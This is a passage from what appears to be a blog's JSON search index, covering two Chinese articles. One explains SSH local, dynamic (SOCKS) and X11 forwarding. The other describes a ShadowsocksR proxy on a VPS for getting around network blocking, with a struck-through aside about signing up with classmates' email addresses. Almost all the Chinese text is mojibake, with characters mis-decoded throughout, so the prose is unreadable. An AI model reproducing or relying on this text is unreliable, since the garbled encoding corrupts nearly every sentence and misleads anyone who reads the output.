æ‰€åœ¨çš„ç¯å¢ƒä¸‹ï¼Œæ—¢å…è®¸ LdapClientHost å‘èµ· SSH è¿æ¥åˆ° LdapServerHostï¼Œä¹Ÿå…è®¸ LdapServerHost å‘èµ· SSH è¿æ¥åˆ° LdapClientHostã€‚é‚£ä¹ˆè¿™æ—¶æˆ‘ä»¬é€‰æ‹©æœ¬åœ°è½¬å‘æˆ–è¿œç¨‹è½¬å‘éƒ½æ˜¯å¯ä»¥çš„ï¼Œèƒ½å®Œæˆä¸€æ ·çš„åŠŸèƒ½ã€‚ æ¥ç€è®©æˆ‘ä»¬æ¥çœ‹ä¸ªè¿›é˜¶ç‰ˆçš„ç«¯å£è½¬å‘ã€‚æˆ‘ä»¬ä¹‹å‰æ¶‰åŠåˆ°çš„å„ç§è¿æ¥ / è½¬å‘éƒ½åªæ¶‰åŠåˆ°äº†ä¸¤å°æœºå™¨ï¼Œè¿˜è®°å¾—æˆ‘ä»¬åœ¨æœ¬åœ°è½¬å‘ä¸­æåˆ°çš„ä¸€ä¸ªé—®é¢˜ä¹ˆï¼Ÿæœ¬åœ°è½¬å‘å‘½ä»¤ä¸­çš„ \u003cremote host\u003e å’Œ \u003cSSH hostname\u003e å¯ä»¥æ˜¯ä¸åŒçš„æœºå™¨ä¹ˆï¼Ÿ ssh -L \u003clocal port\u003e:\u003cremote host\u003e:\u003cremote port\u003e \u003cSSH hostname\u003e ç­”æ¡ˆæ˜¯å¯ä»¥çš„ï¼è®©æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªæ¶‰åŠåˆ°å››å°æœºå™¨ (A,B,C,D) çš„ä¾‹å­ã€‚ å›¾ 4. å¤šä¸»æœºè½¬å‘åº”ç”¨ åœ¨ SSH Client(C) æ‰§è¡Œä¸‹åˆ—å‘½ä»¤æ¥å»ºç«‹ SSH è¿æ¥ä»¥åŠç«¯å£è½¬å‘ï¼š ssh -g -L 7001:\u003cB\u003e:389 \u003cD\u003e ç„¶ååœ¨æˆ‘ä»¬çš„åº”ç”¨å®¢æˆ·ç«¯ï¼ˆAï¼‰ä¸Šé…ç½®è¿æ¥æœºå™¨ï¼ˆCï¼‰çš„ 7001 ç«¯å£å³å¯ã€‚æ³¨æ„æˆ‘ä»¬åœ¨å‘½ä»¤ä¸­æŒ‡å®šäº† -g å‚æ•°ä»¥ä¿è¯æœºå™¨ï¼ˆAï¼‰èƒ½å¤Ÿä½¿ç”¨æœºå™¨ï¼ˆCï¼‰å»ºç«‹çš„æœ¬åœ°ç«¯å£è½¬å‘ã€‚è€Œå¦ä¸€ä¸ªå€¼å¾—æ³¨æ„çš„åœ°æ–¹æ˜¯ï¼Œåœ¨ä¸Šè¿°è¿æ¥ä¸­ï¼Œï¼ˆAï¼‰\u003c-\u003e (C) ä»¥åŠ (B) \u003c-\u003e (D) ä¹‹é—´çš„è¿æ¥å¹¶ä¸æ˜¯å®‰å…¨è¿æ¥ï¼Œå®ƒä»¬ä¹‹é—´æ²¡æœ‰ç»è¿‡ SSH çš„åŠ å¯†åŠè§£å¯†ã€‚å¦‚æœä»–ä»¬ä¹‹é—´çš„ç½‘ç»œå¹¶ä¸æ˜¯å€¼å¾—ä¿¡èµ–çš„ç½‘ç»œè¿æ¥ï¼Œæˆ‘ä»¬å°±éœ€è¦è°¨æ…ä½¿ç”¨è¿™ç§è¿æ¥æ–¹å¼äº†ã€‚ ","date":"2019-03-04","objectID":"/ssh-port-fwd/:2:3","tags":["SSH","ç½‘ç»œ"],"title":"å®æˆ˜ SSH ç«¯å£è½¬å‘","uri":"/ssh-port-fwd/"},{"categories":["æ¢ç´¢"],"content":"ç¬¬ä¸‰éƒ¨åˆ† å…¶ä»–ç±»å‹çš„è½¬å‘ ","date":"2019-03-04","objectID":"/ssh-port-fwd/:3:0","tags":["SSH","ç½‘ç»œ"],"title":"å®æˆ˜ SSH ç«¯å£è½¬å‘","uri":"/ssh-port-fwd/"},{"categories":["æ¢ç´¢"],"content":"åŠ¨æ€è½¬å‘å®ä¾‹åˆ†æ å—¯ï¼ŒåŠ¨æ€è½¬å‘ï¼Œå¬ä¸Šå»å¾ˆé…·ã€‚å½“ä½ çœ‹åˆ°è¿™é‡Œæ—¶ï¼Œæœ‰æ²¡æœ‰æƒ³è¿‡æˆ‘ä»¬å·²ç»è®¨è®ºè¿‡äº†æœ¬åœ°è½¬å‘ï¼Œè¿œç¨‹è½¬å‘ï¼Œä½†æ˜¯å‰æéƒ½æ˜¯è¦æ±‚æœ‰ä¸€ä¸ªå›ºå®šçš„åº”ç”¨æœåŠ¡ç«¯çš„ç«¯å£å·ï¼Œä¾‹å¦‚å‰é¢ä¾‹å­ä¸­çš„ LDAP æœåŠ¡ç«¯çš„ 389 ç«¯å£ã€‚é‚£å¦‚æœæ²¡æœ‰è¿™ä¸ªç«¯å£å·æ€ä¹ˆåŠï¼Ÿç­‰ç­‰ï¼Œä»€ä¹ˆæ ·çš„åº”ç”¨ä¼šæ²¡æœ‰è¿™ä¸ªç«¯å£å·å‘¢ï¼Ÿå—¯ï¼Œæ¯”å¦‚è¯´ç”¨æµè§ˆå™¨è¿›è¡Œ Web æµè§ˆï¼Œæ¯”å¦‚è¯´ MSN ç­‰ç­‰ã€‚ å½“æˆ‘ä»¬åœ¨ä¸€ä¸ªä¸å®‰å…¨çš„ WiFi ç¯å¢ƒä¸‹ä¸Šç½‘ï¼Œç”¨ SSH åŠ¨æ€è½¬å‘æ¥ä¿æŠ¤æˆ‘ä»¬çš„ç½‘é¡µæµè§ˆåŠ MSN ä¿¡æ¯æ— ç–‘æ˜¯ååˆ†å¿…è¦çš„ã€‚è®©æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹åŠ¨æ€è½¬å‘çš„å‘½ä»¤æ ¼å¼ï¼š ssh -D \u003clocal port\u003e \u003cSSH Server\u003e ä¾‹å¦‚ï¼š ssh -D 7001 \u003cSSH Server\u003e å›¾ 5. åŠ¨æ€ç«¯å£è½¬å‘ ä¼¼ä¹å¾ˆç®€å•ï¼Œæˆ‘ä»¬ä¾ç„¶é€‰æ‹©äº† 7001 ä½œä¸ºæœ¬åœ°çš„ç«¯å£å·ï¼Œå…¶å®åœ¨è¿™é‡Œ SSH æ˜¯åˆ›å»ºäº†ä¸€ä¸ª SOCKS ä»£ç†æœåŠ¡ã€‚æ¥çœ‹çœ‹å¸®åŠ©æ–‡æ¡£ä¸­å¯¹ -D å‚æ•°çš„æè¿°ï¼š -D port This works by allocating a socket to listen to port on the local side, and whenever a connection is made to this port, the con- nection is forwarded over the secure channel, and the applica- tion protocol is then used to determine where to connect to from the remote machine. Currently the SOCKS4 and SOCKS5 protocols are supported, and ssh will act as a SOCKS server. Only root can forward privileged ports. Dynamic port forwardings can also be specified in the configuration file. ä¹‹åçš„ä½¿ç”¨å°±ç®€å•äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨ localhost:7001 æ¥ä½œä¸ºæ­£å¸¸çš„ SOCKS ä»£ç†æ¥ä½¿ç”¨ï¼Œç›´æ¥åœ¨æµè§ˆå™¨æˆ– MSN ä¸Šè®¾ç½®å³å¯ã€‚åœ¨ SSH Client ç«¯æ— æ³•è®¿é—®çš„ç½‘ç«™ç°åœ¨ä¹Ÿéƒ½å¯ä»¥æ­£å¸¸æµè§ˆã€‚è€Œè¿™é‡Œéœ€è¦å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œæ­¤æ—¶ SSH æ‰€åŒ…æŠ¤çš„èŒƒå›´åªåŒ…æ‹¬ä»æµè§ˆå™¨ç«¯ï¼ˆSSH Client ç«¯ï¼‰åˆ° SSH Server ç«¯çš„è¿æ¥ï¼Œå¹¶ä¸åŒ…å«ä» SSH Server ç«¯ åˆ°ç›®æ ‡ç½‘ç«™çš„è¿æ¥ã€‚å¦‚æœååŠæˆªè¿æ¥çš„å®‰å…¨ä¸èƒ½å¾—åˆ°å……åˆ†çš„ä¿è¯çš„è¯ï¼Œè¿™ç§æ–¹å¼ä»ä¸æ˜¯åˆé€‚çš„è§£å†³æ–¹æ¡ˆã€‚ ","date":"2019-03-04","objectID":"/ssh-port-fwd/:3:1","tags":["SSH","ç½‘ç»œ"],"title":"å®æˆ˜ SSH ç«¯å£è½¬å‘","uri":"/ssh-port-fwd/"},{"categories":["æ¢ç´¢"],"content":"X åè®®è½¬å‘å®ä¾‹åˆ†æ å¥½äº†ï¼Œè®©æˆ‘ä»¬æ¥çœ‹æœ€åä¸€ä¸ªä¾‹å­ - X åè®®è½¬å‘ã€‚ æˆ‘ä»¬æ—¥å¸¸å·¥ä½œå½“ä¸­ï¼Œå¯èƒ½ä¼šç»å¸¸ä¼šè¿œç¨‹ç™»å½•åˆ° Linux/Unix/Solaris/HP ç­‰æœºå™¨ä¸Šå»åšä¸€äº›å¼€å‘æˆ–è€…ç»´æŠ¤ï¼Œä¹Ÿç»å¸¸éœ€è¦ä»¥ GUI æ–¹å¼è¿è¡Œä¸€äº›ç¨‹åºï¼Œæ¯”å¦‚è¦æ±‚å›¾å½¢åŒ–ç•Œé¢æ¥å®‰è£… DB2/WebSphere ç­‰ç­‰ã€‚è¿™æ—¶å€™é€šå¸¸æœ‰ä¸¤ç§é€‰æ‹©æ¥å®ç°ï¼šVNC æˆ–è€… X çª—å£ï¼Œè®©æˆ‘ä»¬æ¥çœ‹çœ‹åè€…ã€‚ ä½¿ç”¨ X çª—å£é€šå¸¸éœ€è¦åˆ†åˆ«å®‰è£…ï¼šX Client å’Œ X Server ã€‚åœ¨æœ¬ä¾‹ä¸­æˆ‘ä»¬çš„ X Client å°±æ˜¯æ‰€è®¿é—®çš„è¿œç¨‹ Linux/Unix/Solaris/HPï¼Œè€Œæˆ‘ä»¬çš„ X Server åˆ™æ˜¯å‘èµ·è®¿é—®çš„æœ¬åœ°æœºå™¨ï¼ˆä¾‹å¦‚ä½ é¢å‰æ­£åœ¨ä½¿ç”¨çš„ç¬”è®°æœ¬æˆ–å°å¼æœºï¼‰ã€‚æŠŠ X Client ç«¯çš„ X çª—å£æ˜¾ç¤ºåœ¨ X Server ç«¯éœ€è¦å…ˆè¡Œåœ¨ X Client ç«¯æŒ‡å®š X Server çš„ä½ç½®ï¼Œå‘½ä»¤æ ¼å¼å¦‚ä¸‹ï¼š export DISPLAY=\u003cX Server IP\u003e:\u003cdisplay #\u003e.\u003cvirtual #\u003e ä¾‹å¦‚ï¼š export DISPLAY=myDesktop:1.0 ç„¶åç›´æ¥è¿è¡Œ X åº”ç”¨å³å¯ï¼ŒX çª—å£å°±ä¼šè‡ªåŠ¨åœ¨æˆ‘ä»¬çš„æœ¬åœ°ç«¯æ‰“å¼€ã€‚ ä¸€åˆ‡è¿è¡Œæ­£å¸¸ï¼Œä½†æ˜¯ï¼Œè¿™æ—¶å€™ IT éƒ¨é—¨çªç„¶åœ¨è¿œç¨‹ Linux/Unix/Solaris/HP å‰é¢åŠ äº†ä¸€é“é˜²ç«å¢™ã€‚éå¸¸ä¸å¹¸çš„æ˜¯ï¼ŒX åè®®å¹¶ä¸åœ¨å…è®¸é€šè¿‡çš„åˆ—è¡¨ä¹‹å†…ã€‚æ€ä¹ˆåŠï¼Ÿåªèƒ½ä½¿ç”¨ VNC äº†ä¹ˆï¼Ÿä¸ï¼Œå…¶å®åªè¦ä½¿ç”¨äº† SSH ç«¯å£è½¬å‘å³å¯é€šè¿‡ï¼ŒåŒæ—¶ä¹Ÿå¯¹ X é€šè®¯æ•°æ®åšäº†åŠ å¯†ï¼ŒçœŸæ˜¯ä¸€ä¸¾ä¸¤å¾—ã€‚ï¼ˆå½“ç„¶ï¼Œä½¿ç”¨æ­¤æ–¹æ³•å‰æœ€å¥½å…ˆå’¨è¯¢ç›¸å…³ IT éƒ¨é—¨æ˜¯å¦ç¬¦åˆç›¸åº”çš„å®‰å…¨æ¡ä¾‹ï¼Œä»¥å…é€ æˆè¿è§„æ“ä½œã€‚ï¼‰ å»ºç«‹å‘½ä»¤ä¹Ÿå¾ˆç®€å•ï¼Œç›´æ¥ä»æœ¬åœ°æœºå™¨ï¼ˆX Server ç«¯ï¼‰å‘èµ·ä¸€ä¸ªå¦‚ä¸‹çš„ SSH è¿æ¥å³å¯ï¼š ssh -X \u003cSSH Server\u003e å›¾ 6. X è½¬å‘ å»ºç«‹è¿æ¥ä¹‹åå°±å¯ä»¥ç›´æ¥è¿è¡Œè¿œç¨‹çš„ X åº”ç”¨ã€‚æ³¨æ„å»ºç«‹ X è½¬å‘ä¹‹åä¼šè‡ªåŠ¨è®¾ç½® DISPLAY ç¯å¢ƒå˜é‡ï¼Œé€šå¸¸ä¼šè¢«è®¾ç½®æˆ localhost:10.0ï¼Œæˆ‘ä»¬æ— éœ€ä¹Ÿä¸åº”è¯¥åœ¨è¿æ¥ä¹‹åå†è¿›è¡Œä¿®æ”¹æ­¤ç¯å¢ƒå˜é‡ã€‚ ä¸€ä¸ªæ¯”è¾ƒå¸¸è§çš„åœºæ™¯æ˜¯ï¼Œæˆ‘ä»¬çš„æœ¬åœ°æœºå™¨æ˜¯ Windows æ“ä½œç³»ç»Ÿï¼Œè¿™æ—¶å¯ä»¥é€‰æ‹©å¼€æºçš„ XMing æ¥ä½œä¸ºæˆ‘ä»¬çš„ XServerï¼Œè€Œ SSH Client åˆ™å¯ä»¥ä»»æ„é€‰æ‹©äº†ï¼Œä¾‹å¦‚ PuTTYï¼ŒCygwin å‡å¯ä»¥é…ç½®è®¿é—® SSH çš„åŒæ—¶å»ºç«‹ X è½¬å‘ã€‚ ","date":"2019-03-04","objectID":"/ssh-port-fwd/:3:2","tags":["SSH","ç½‘ç»œ"],"title":"å®æˆ˜ SSH ç«¯å£è½¬å‘","uri":"/ssh-port-fwd/"},{"categories":["æ¢ç´¢"],"content":"ç¬¬å››éƒ¨åˆ† æ€»ç»“ è‡³æ­¤ï¼Œæˆ‘ä»¬å·²ç»å®Œæˆäº†æœ¬åœ°ç«¯å£è½¬å‘ï¼Œè¿œç¨‹ç«¯å£è½¬å‘ï¼ŒåŠ¨æ€ç«¯å£è½¬å‘ä»¥åŠ X è½¬å‘çš„ä»‹ç»ã€‚å›é¡¾èµ·æ¥ï¼Œæ€»çš„æ€è·¯æ˜¯é€šè¿‡å°† TCP è¿æ¥è½¬å‘åˆ° SSH é€šé“ä¸Šä»¥è§£å†³æ•°æ®åŠ å¯†ä»¥åŠçªç ´é˜²ç«å¢™çš„ç§ç§é™åˆ¶ã€‚å¯¹ä¸€äº›å·²çŸ¥ç«¯å£å·çš„åº”ç”¨ï¼Œä¾‹å¦‚ Telnet/LDAP/SMTPï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æœ¬åœ°ç«¯å£è½¬å‘æˆ–è€…è¿œç¨‹ç«¯å£è½¬å‘æ¥è¾¾åˆ°ç›®çš„ã€‚åŠ¨æ€ç«¯å£è½¬å‘åˆ™å¯ä»¥å®ç° SOCKS ä»£ç†ä»è€ŒåŠ å¯†ä»¥åŠçªç ´é˜²ç«å¢™å¯¹ Web æµè§ˆçš„é™åˆ¶ã€‚å¯¹äº X åº”ç”¨ï¼Œæ— ç–‘æ˜¯ X è½¬å‘æœ€ä¸ºé€‚ç”¨äº†ã€‚è™½ç„¶æ¯ä¸€éƒ¨åˆ†æˆ‘ä»¬éƒ½åªæ˜¯ç®€å•çš„ä»‹ç»äº†ä¸€ä¸‹ï¼Œä½†å¦‚æœèƒ½çµæ´»åº”ç”¨è¿™äº›æŠ€å·§ï¼Œç›¸ä¿¡å¯¹æˆ‘ä»¬çš„æ—¥å¸¸ç”Ÿæ´» / å·¥ä½œä¹Ÿæ˜¯ä¼šæœ‰æ‰€å¸®åŠ©çš„ã€‚ ç›¸å…³ä¸»é¢˜ ã€ŠSSH æƒå¨æŒ‡å—ã€‹ï¼ˆOâ€™Reilly å›¾ä¹¦ï¼‰è¯¦ç»†ä»‹ç»äº† SSH ç›¸å…³çš„æ›´å¤šæŠ€æœ¯å†…å¹•åŠç›¸å…³æŠ€å·§ã€‚ åœ¨ developerWorks ä¸­å›½ç½‘ç«™ Linux ä¸“åŒº ä¸­å­¦ä¹ æ›´å¤š Linux æ–¹é¢çš„çŸ¥è¯†ã€‚ ","date":"2019-03-04","objectID":"/ssh-port-fwd/:4:0","tags":["SSH","ç½‘ç»œ"],"title":"å®æˆ˜ SSH ç«¯å£è½¬å‘","uri":"/ssh-port-fwd/"},{"categories":["æ¢ç´¢"],"content":"2022.03.10 æ›´æ–° ç›®å‰åŸæ–‡å·²æ¶ˆå¤±ï¼Œå½“æ—¶æ²¡æœ‰å°†å…¶ä¸­çš„å›¾ç‰‡ä¿å­˜åˆ°å›¾åºŠï¼Œå› æ­¤æ‰€æœ‰å›¾ç‰‡å‡å·²å¤±æ•ˆã€‚ ","date":"2019-03-04","objectID":"/ssh-port-fwd/:5:0","tags":["SSH","ç½‘ç»œ"],"title":"å®æˆ˜ SSH ç«¯å£è½¬å‘","uri":"/ssh-port-fwd/"},{"categories":["æ¢ç´¢"],"content":"å› ä¸ºä¼—æ‰€å‘¨çŸ¥çš„åŸå› ï¼Œæœ¬æ–‡ä¸­ä¸ä¼šæä¾›ä»»ä½•ç›¸å…³å·¥å…·çš„ä¸‹è½½é“¾æ¥ã€‚ å°±åœ¨ä¸ä¹…å‰ï¼Œæˆ‘åŸæ¥ä½¿ç”¨çš„å…è´¹é­”æ³•é“å…·è«åå¤±æ•ˆäº†ã€‚ä¸€æ€’ä¹‹ä¸‹æˆ‘å†³å®šå¯»æ‰¾ä¸€ç§å¯æŒç»­çš„é­”æ³•æ¥è®¿é—®ç½‘ç»œã€‚ ","date":"2019-03-04","objectID":"/magical-surfing/:0:0","tags":["ç½‘ç»œ"],"title":"å‡¿å£å·å…‰ï¼šé­”æ³•ä¸Šç½‘çš„å¯æŒç»­è§£å†³æ–¹æ¡ˆ","uri":"/magical-surfing/"},{"categories":["æ¢ç´¢"],"content":"æœåŠ¡å™¨ç«¯ ç”±äºé…¸é…¸ä¹³çš„å¤§åæ—©æœ‰è€³é—»ï¼Œç»“åˆæˆ‘æ ¡ä¸€ä½å¤§ä½¬çš„ è¿™ç¯‡æ–‡ç«  ä¸­ç»™å‡ºçš„æ–¹æ³•ï¼Œå°±å¯ä»¥æ­å»ºå¥½æœåŠ¡å™¨ç«¯ã€‚æˆ‘ç”šè‡³æ²¡æœ‰ä½¿ç”¨ GitHub æä¾›çš„å­¦ç”Ÿä¼˜æƒ ç ï¼Œå› ä¸ºæˆ‘ä¸€æ³¨å†Œ DOï¼ˆä¸ºæ­¤æˆ‘ç”šè‡³æ³¨å†Œäº† PayPalï¼‰å°±é€äº† 60 å¤©æœ‰æ•ˆçš„ $100ï¼ˆè¿™æ˜¯å› ä¸º DO æœ‰é‚€è¯·æ³¨å†Œçš„æœºåˆ¶ï¼Œæ¯”å¦‚ç‚¹ è¿™é‡Œ æ³¨å†ŒåŒæ ·èƒ½è·å¾— $100ï¼‰ã€‚æˆ‘ç°åœ¨æ­£å‘æ„æ€ä¹ˆç”¨æ‰å®ƒâ€¦â€¦ æœŸé—´æ³¨å†Œæ—¶æ”¯ä»˜çš„ $5 ç¬¬äºŒå¤©æ‰åˆ°è´¦ï¼Œå¯èƒ½ PayPal æ˜¯ä¼šæ…¢ä¸€ç‚¹ï¼Ÿ å› ä¸ºæˆ‘çš„èœœæ±è‡ªä¿¡ï¼Œå»ºæœåŠ¡å™¨çš„æ—¶å€™éšæ‰‹åŠ äº† SSH keyï¼Œå¯¼è‡´æˆ‘ä¸€å¼€å§‹éƒ½ä¸èƒ½ç”¨ç”¨æˆ·åå’Œå¯†ç ç™»å½•æœåŠ¡å™¨ã€‚åœ¨è¯¦ç»†çš„å®˜ç½‘æ–‡æ¡£çš„å¸®åŠ©ä¸‹è§£å†³äº†é—®é¢˜ï¼Œå®é™…ä¸Šå³ä½¿åœ¨ Windows ç¯å¢ƒä¸‹ï¼ŒPuTTY ä¹Ÿä¸æ˜¯å¿…é¡»å®‰è£…çš„ï¼Œå¯ä»¥ç”¨ bash ä¸‹æ›´æ–¹ä¾¿çš„ openssh æ¥è¿æ¥ã€‚ä¹‹åä¹Ÿå¯ä»¥ç”Ÿæˆ SSH å¯†é’¥éƒ¨ç½²å¥½ä»¥åé€šè¿‡ SSH ç™»å½•ã€‚ èŠ±äº†ä¸€äº›æ—¶é—´çš„æ˜¯è¿œç¨‹ç™»é™†æ—¶æç¤º Permission denied (publickey,gssapi-keyex,gssapi-with-mic) çš„é—®é¢˜ã€‚åŸå› æœ‰å¾ˆå¤šï¼Œç½‘ä¸Šçš„è§£å†³æ–¹æ¡ˆä¹Ÿå„ä¸ç›¸åŒï¼Œæœ€åè¿˜æ˜¯åœ¨é è°±çš„ StackOverFlow ä¸Šæ‰¾åˆ°äº†é€‚åˆæˆ‘çš„æƒ…å†µï¼šå°† /etc/ssh/sshd_config é‡Œçš„ PasswordAuthentication è®¾ä¸º yesï¼Œéšåé‡å¯ sshd æœåŠ¡ã€‚ è´¹ç”¨ä¸Šï¼Œæœ€ä½é…ç½®çš„ VPS éœ€è¦ $5 / æœˆï¼Œå¯ä»¥æ¥å—ã€‚ç”±äºæœ‰æ³¨å†Œçš„ $5 + é€çš„ $100ï¼ˆè™½ç„¶å°±ä¸¤ä¸ªæœˆï¼‰+ GitHub å­¦ç”ŸåŒ…çš„ $60 + é‚€è¯·ç”¨æˆ·æœºåˆ¶ï¼Œè‡³å°‘å¯ä»¥å…è´¹ç”¨ä¸€å¹´å¤šã€‚å¦‚æœå¯ä»¥é‚€è¯·åˆ°åŒå­¦æ³¨å†Œ / æ‹‰åŒå­¦ä¸€èµ·æ–½å±•é­”æ³• / ~~ æ‹¿åŒå­¦çš„é‚®ç®±æ³¨å†Œå­¦ç”ŸåŒ…~~ çš„è¯ï¼Œå…è´¹ä½¿ç”¨çš„æœŸé™å°±æ›´é•¿äº†ã€‚æ‰€ä»¥è¿™ä¸ªæ–¹æ³•è¿˜æ˜¯ç›¸å½“ç¨³å®šæŒä¹…çš„ã€‚ ","date":"2019-03-04","objectID":"/magical-surfing/:1:0","tags":["ç½‘ç»œ"],"title":"å‡¿å£å·å…‰ï¼šé­”æ³•ä¸Šç½‘çš„å¯æŒç»­è§£å†³æ–¹æ¡ˆ","uri":"/magical-surfing/"},{"categories":["æ¢ç´¢"],"content":"å®¢æˆ·ç«¯ å®¢æˆ·ç«¯é…ç½®å°±å®¹æ˜“å¤šäº†ï¼Œä¸‹è½½å¥½é…¸é…¸ä¹³ï¼Œå¡«å¥½é…ç½®ä¿¡æ¯å…¶å®å°±èƒ½ç”¨äº†ã€‚ä¸è¿‡ä¸€èˆ¬éƒ½ä¼šè®¾ç½®ç³»ç»Ÿä»£ç†æ¨¡å¼ä¸º PAC æ¨¡å¼ï¼Œä½¿å¾—é­”æ³•ä»…ä»…åœ¨éœ€è¦çš„æ—¶å€™æ–½å±•ï¼Œä¼˜åŒ–ä¸Šç½‘ä½“éªŒã€‚ ç„¶è€Œä¸€éƒ¨åˆ†ç½‘ç«™ï¼ˆåˆ«é—®ï¼Œé—®å°±æ˜¯ä¸çŸ¥é“ï¼‰åœ¨ PAC æ¨¡å¼ä¸‹æ— æ³•è®¿é—®æˆ–è€…è®¿é—®æ—¶å‡ºç°å¼‚å¸¸ï¼Œè¿™æ—¶æˆ‘ä»¬è¿˜æ˜¯éœ€è¦å¼€å¯å…¨å±€æ¨¡å¼ã€‚è¿™æ ·ä¸æ–­è°ƒæ•´é…¸é…¸ä¹³çš„è®¾ç½®æ¯”è¾ƒéº»çƒ¦ï¼Œäºæ˜¯ Chrome æ’ä»¶ SwitchyOmega / Firefox æ’ä»¶ AutoProxy å…è®¸æˆ‘ä»¬åˆ—ä¸€ä¸ªåå•ï¼Œåœ¨è®¿é—®åå•å†…çš„ç½‘å€æ—¶è‡ªåŠ¨åˆ‡æ¢è‡³å…¨å±€æ¨¡å¼ï¼Œè®¿é—®å…¶å®ƒç½‘å€åˆ™åˆ‡å› PAC æ¨¡å¼ã€‚ å½“ç„¶é…¸é…¸ä¹³å¥½åƒæœ¬æ¥ä¹Ÿå¯ä»¥ç¼–è¾‘ PAC åˆ—è¡¨çš„ã€‚è¿™ä¸¤ä¸ªæ’ä»¶æä¾›çš„æœ€ä¸»è¦çš„åŠŸèƒ½åœ¨äº â€œè‡ªåŠ¨åˆ‡æ¢æƒ…æ™¯æ¨¡å¼â€ã€‚è¯¦ç»†é…ç½®æ–¹æ³•è¿™é‡Œä¸è¿‡å¤šèµ˜è¿°äº†ã€‚ ","date":"2019-03-04","objectID":"/magical-surfing/:2:0","tags":["ç½‘ç»œ"],"title":"å‡¿å£å·å…‰ï¼šé­”æ³•ä¸Šç½‘çš„å¯æŒç»­è§£å†³æ–¹æ¡ˆ","uri":"/magical-surfing/"},{"categories":["æ¢ç´¢"],"content":"TO-DO æœ€è¿‘å­¦æ ¡åˆå°ç½‘äº†ï¼Œç”±äºæˆ‘å°šä¸”ä¸æ¸…æ¥šçš„åŸå› ï¼Œç”¨å­¦æ ¡æä¾›çš„ Cisco AnyConnect è®¿é—®å­¦æ ¡å†…ç½‘æ—¶ï¼Œæˆ‘çš„é­”æ³•å‡ºäº†äº›é—®é¢˜ã€‚åŸå› æ˜¯ä»€ä¹ˆï¼Ÿèƒ½ä¸èƒ½è®©ä¸¤è€…å…±å­˜å‘¢ï¼Ÿç•™å‘ï¼ˆ2019.03.13 æ›´æ–°ï¼šå·²å¡«ï¼‰ã€‚ ","date":"2019-03-04","objectID":"/magical-surfing/:3:0","tags":["ç½‘ç»œ"],"title":"å‡¿å£å·å…‰ï¼šé­”æ³•ä¸Šç½‘çš„å¯æŒç»­è§£å†³æ–¹æ¡ˆ","uri":"/magical-surfing/"},{"categories":["æ¢ç´¢"],"content":"é™„å½• é…¸é…¸ä¹³çš„å·¥ä½œåŸç†å±…ç„¶å¼‚å¸¸ç®€å•ã€‚ç±»ä¼¼ SSH éš§é“ï¼Œåœ¨å®¢æˆ·ç«¯ä»£ç†å’Œ VPS ä¹‹é—´è¿›è¡ŒåŠ å¯†é€šè®¯æ¥é¿å…æµé‡ç‰¹å¾åˆ†æï¼Œè€Œ VPS å’Œè¦è®¿é—®çš„ç½‘ç«™ä¹‹é—´çš„é€šè®¯æ˜¯ç•…é€šçš„ã€‚è€Œè¿™ä¸ªå·¥å…·çš„åå­—æ¥æºäºå®ƒæ‰€åŸºäºçš„5 åªè¢œå­ SOCKS5 åè®®ï¼ˆç»‘å®šç«¯å£ 1080ï¼‰ã€‚å¹¸å¥½è®¡ç½‘æœ‰è®¤çœŸå­¦ï¼Œæ²¡è§è¿‡çš„åè®®ä¹Ÿèƒ½ä¸¾ä¸€åä¸‰å¤§æ¦‚æ˜ç™½ä¸€ç‚¹ã€‚ æœ€åå¸Œæœ›è¿™ç¯‡æ–‡ç« ä¸è¦æ¶ˆå¤±ã€‚ ","date":"2019-03-04","objectID":"/magical-surfing/:4:0","tags":["ç½‘ç»œ"],"title":"å‡¿å£å·å…‰ï¼šé­”æ³•ä¸Šç½‘çš„å¯æŒç»­è§£å†³æ–¹æ¡ˆ","uri":"/magical-surfing/"},{"categories":["æ¢ç´¢"],"content":"2019.03.09 æ›´æ–° ä½¿ç”¨æ—¶å‘ç°é€Ÿåº¦è¾ƒæ…¢ï¼Œäºæ˜¯åœ¨æœåŠ¡å™¨ç«¯é…ç½®äº† BBR åŠ é€Ÿã€‚è¿™ä¸ªç”± Google æ¨å‡ºçš„ TCP æ‹¥å¡æ§åˆ¶åè®®ç®€ç›´å°±æ˜¯é»‘é­”æ³•ï¼ˆè¦æ±‚ Linux å†…æ ¸ 4.9 ä»¥ä¸Šï¼‰ï¼Œä¸ä»…å®‰è£…ç®€å•è€Œä¸”å¯¹é€Ÿåº¦çš„æå‡è‚‰çœ¼å¯è§ã€‚ é¡ºä¾¿å‚è€ƒ é…¸é…¸ä¹³çš„ä¸€ç¯‡æ–‡æ¡£ è°ƒæ•´äº†é…¸é…¸ä¹³çš„æ··æ·†ç­–ç•¥ï¼ŒåŠ å¯†ç®—æ³•ã€åè®®å’Œæ··æ·†ç®—æ³•é‡‡ç”¨äº† none + auth_chain_a + tls1.2_ticket_auth çš„ç»„åˆï¼Œå¤§æ¦‚æ˜¯æ›´é²æ£’äº†å§ã€‚ ","date":"2019-03-04","objectID":"/magical-surfing/:5:0","tags":["ç½‘ç»œ"],"title":"å‡¿å£å·å…‰ï¼šé­”æ³•ä¸Šç½‘çš„å¯æŒç»­è§£å†³æ–¹æ¡ˆ","uri":"/magical-surfing/"},{"categories":["æ¢ç´¢"],"content":"2019.03.13 æ›´æ–° ä»Šå¤©é…¸é…¸ä¹³ä¸çŸ¥é“ä¸ºä»€ä¹ˆçˆ†ç‚¸äº†ï¼Œå°è¯•å¤šç§æ–¹æ³•æ— æœã€‚IP åœ°å€ + ç«¯å£å·èƒ½ ping é€šï¼ŒæœåŠ¡ä¹Ÿé‡å¯äº†å‡ æ¬¡ï¼ŒVPS æœ¬èº«å’Œæµè§ˆå™¨çš„ SwitchOmega å¹¶æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œé…¸é…¸ä¹³åœ¨ä¸¤ç«¯çš„é…ç½®ä¹Ÿæ²¡é—®é¢˜ï¼ŒçœŸæ˜¯å¥‡æ€ªå•Šã€‚æœ€åé€šè¿‡è¯¥ç«¯å£å·è§£å†³äº†ï¼ŒåŸå› ä¸æ˜ã€‚ é¡ºä¾¿æ£é¼“äº†ä¸€ä¸‹ SwitchyOmega çš„é…ç½®ï¼Œå¯¹äºå­¦æ 